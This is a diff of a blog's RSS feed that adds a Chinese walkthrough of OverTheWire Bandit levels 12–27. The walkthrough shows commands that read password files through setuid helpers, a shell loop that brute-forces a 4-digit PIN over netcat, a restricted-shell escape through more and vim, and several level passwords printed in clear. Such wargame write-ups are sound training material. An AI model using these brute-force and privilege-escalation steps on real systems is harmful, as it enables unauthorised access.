@@ -1,18 +1,1255 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
-        <title>Lee</title>
-        <link>http://chenyuan1125.github.io/</link>
-        <description>Recent content on Lee</description>
+        <title>尘</title>
+        <link>chenyuan1125.github.io/</link>
+        <description>Recent content on 尘</description>
         <generator>Hugo -- gohugo.io</generator>
-        <language>en</language>
-        <copyright>Lee</copyright><atom:link href="http://chenyuan1125.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <language>zh-cn</language>
+        <copyright>Lee</copyright><atom:link href="chenyuan1125.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>bandit实验</title>
+        <link>chenyuan1125.github.io/p/bandit%E5%AE%9E%E9%AA%8C/</link>
+        <pubDate>Sun, 06 Oct 2024 00:00:00 +0000</pubDate>
+        
+        <guid>chenyuan1125.github.io/p/bandit%E5%AE%9E%E9%AA%8C/</guid>
+        <description>&lt;img src="chenyuan1125.github.io/chenyuan1125.github.io/p/bandit%E5%AE%9E%E9%AA%8C/1.jpg" alt="Featured image of post bandit实验" /&gt;&lt;p&gt;&lt;strong&gt;参考博客&lt;/strong&gt;：&lt;a class=&#34;link&#34; href=&#34;https://overthewire.org/wargames/bandit/bandit13.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;OverTheWire: Level Goal: Bandit Level 12 → Level 13&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;level12-13&#34;&gt;&lt;strong&gt;level12-13&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;主要思路： 先将文件转化为二进制文件，再利用file命令查看文件类型，根据文件类型来解压缩&lt;/p&gt;
+&lt;h3 id=&#34;level17-18&#34;&gt;&lt;strong&gt;level17-18&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;利用diff -a&lt;/p&gt;
+&lt;h3 id=&#34;level18-19&#34;&gt;&lt;strong&gt;level18-19&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;The password for the next level is stored in a file &lt;strong&gt;readme&lt;/strong&gt; in the homedirectory. Unfortunately, someone has modified &lt;strong&gt;.bashrc&lt;/strong&gt; to log you out when you log in with SSH.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh -p &lt;span class=&#34;m&#34;&gt;2220&lt;/span&gt; bandit18@bandit.labs.overthewire.org cat readme
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;level19-20&#34;&gt;&lt;strong&gt;level19-20&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;setuid，利用bandit20.do文件来提权root&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./bandit20-do  cat /etc/bandit_pass/bandit20
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;level20-21&#34;&gt;&lt;strong&gt;level20-21&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;利用nc -lv 监听端口，再用./suconnect 端口号连接&lt;/p&gt;
+&lt;h3 id=&#34;level21-22&#34;&gt;&lt;strong&gt;level21-22&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;找到对应的crond脚本&lt;/p&gt;
+&lt;h3 id=&#34;level22-23&#34;&gt;&lt;strong&gt;level22-23&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;找到对应脚本,再把bandit23的mytarget找出来，再读取密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit22@bandit:/etc/cron.d$ cat  /usr/bin/cronjob_bandit23.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;myname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;whoami&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;mytarget&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; I am user &lt;span class=&#34;nv&#34;&gt;$myname&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; md5sum &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -d &lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt; -f 1&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Copying passwordfile /etc/bandit_pass/&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$myname&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; to /tmp/&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$mytarget&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/bandit_pass/&lt;span class=&#34;nv&#34;&gt;$myname&lt;/span&gt; &amp;gt; /tmp/&lt;span class=&#34;nv&#34;&gt;$mytarget&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit22@bandit:/etc/cron.d$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; I am user bandit23 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; md5sum &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -d &lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt; -f &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;level23-24&#34;&gt;&lt;strong&gt;level23-24&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;找到对应脚本，参考上一个level的脚本，创建一个新的脚本来获取密码，注意文件的权限问题&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/bandit_pass/bandit24 &amp;gt; /tmp/bandit24/bandit24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;level24-25&#34;&gt;&lt;strong&gt;level24-25&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Level Goal&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+You do not need to create new connections each time&lt;/p&gt;
+&lt;p&gt;tips： nc localhost 30002  利用shell脚本进行爆破&lt;/p&gt;
+&lt;p&gt;注意程序可能会因为超时卡住，所以要分段爆破&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i in &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;0000..9999&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; ./banditpin
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat ./banditpin &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc localhost &lt;span class=&#34;m&#34;&gt;30002&lt;/span&gt; &amp;gt;&amp;gt; ./bandit25pass
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;level25-26&#34;&gt;level25-26
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Level Goal&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not &lt;strong&gt;/bin/bash&lt;/strong&gt;, but something else. Find out what it is, how it works and how to break out of it.&lt;/p&gt;
+&lt;p&gt;参考博客：&lt;a class=&#34;link&#34; href=&#34;https://mayadevbe.me/posts/overthewire/bandit/level26/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;OverTheWire Bandit Level 25 -&amp;gt; 26 - Walkthrough - MayADevBe Blog&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;ls发现目录下有bandit26的私钥，尝试使用ssh -i 进行连接，连接失败，由于/bin/bash被修改。&lt;/p&gt;
+&lt;p&gt;利用cat  /etc/passwd查看bandit26所使用的shell，发现为/usr/bin/showtext，再查看这个文件，发现它是个脚本，并且通过more打开了text.txt文件，&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit25@bandit:~$ cat /etc/passwd &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep bandit26
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit25@bandit:~$ ls -la /usr/bin/showtext
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /usr/bin/showtext
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit25@bandit:~$ cat /usr/bin/showtext
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#!/bin/sh&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;TERM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;linux
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;more ~/text.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;再次尝试ssh连接，失败&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ssh -i bandit26.sshkey bandit26@localhost
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  _                     _ _ _   ___   __  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;/ /  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__   __ _ _ __   __&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_   &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; / /_  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;_ \ / _` | &amp;#39;&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;/ _&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; __&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; / / &lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ / /&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_.__/ &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;__/ 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection to bandit.labs.overthewire.org closed.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;分析原因，如果text.txt文件超过一页，那么more text.txt就会等待翻页，显然，text.txt文件太小，此时需要另辟蹊径，既然文件本身改变不了，那么反过来改变运行窗口的大小也能起到同样的作用。&lt;/p&gt;
+&lt;p&gt;进入more以后，使用v进入vim编辑模式，再通过&amp;quot;:e /etc/bandit_pass_bandit26&amp;quot;得到password。（-e 打开文件）&lt;/p&gt;
+&lt;p&gt;或者通过:set shell=/bin/bash    :shell 来进入bandit26用户&lt;/p&gt;
+&lt;h3 id=&#34;level26-27&#34;&gt;level26-27
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Level Goal&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Good job getting a shell! Now hurry and grab the password for bandit27!&lt;/p&gt;
+&lt;p&gt;bandit27.do已被setid，所以执行这个文件时会短暂使用root用户权限，借此我们可以执行其它命令。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit26@bandit:~$ ls
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit27-do  text.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit26@bandit:~$ ./bandit27-do 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Run a &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; as another user.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Example: ./bandit27-do id
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bandit26@bandit:~$ ./bandit27-do cat /etc/bandit&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;pass/bandit27
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3ba3118a22e93127a4ed485be72ef5ea
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;level27-28&#34;&gt;level27-28
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Level Goal&lt;/strong&gt;&lt;/p&gt;
